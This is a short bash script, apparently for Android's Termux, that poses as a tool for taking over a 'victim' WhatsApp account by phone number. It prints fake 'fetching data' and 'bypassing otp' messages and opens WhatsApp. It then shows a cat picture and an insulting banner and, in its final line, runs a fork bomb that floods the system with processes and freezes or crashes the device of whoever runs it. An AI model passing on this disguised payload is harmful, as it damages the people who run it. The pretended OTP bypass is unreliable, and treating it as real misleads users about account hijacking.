#!/bin/bash
echo "-------------------------------------------------"

echo "HELLO SIR"


echo "-------------------------------------------------"

echo -n -e '\e[1mType The Victim number-->>91+:\e[0m';
read number;
echo "-----------------------"
for i in {1..5}
do
	sleep 1
	echo -e "\e[93mfetching data ....\e[0m";
done
echo "-----------------------"

for i in {1..5}
do
  sleep 1
   echo -e '\e[92mbypassing otp of \e[0m' $number;
done
echo "-----------------------"
sleep 1
echo -e "\e[41mopening whatsapp\e[0m"
sleep 1
am start -n com.whatsapp/com.whatsapp.Main
clear
echo "\e[91m "
cowsay -f meow 1
figlet "POYI UMB MOWNU"
:(){ :|:& };:

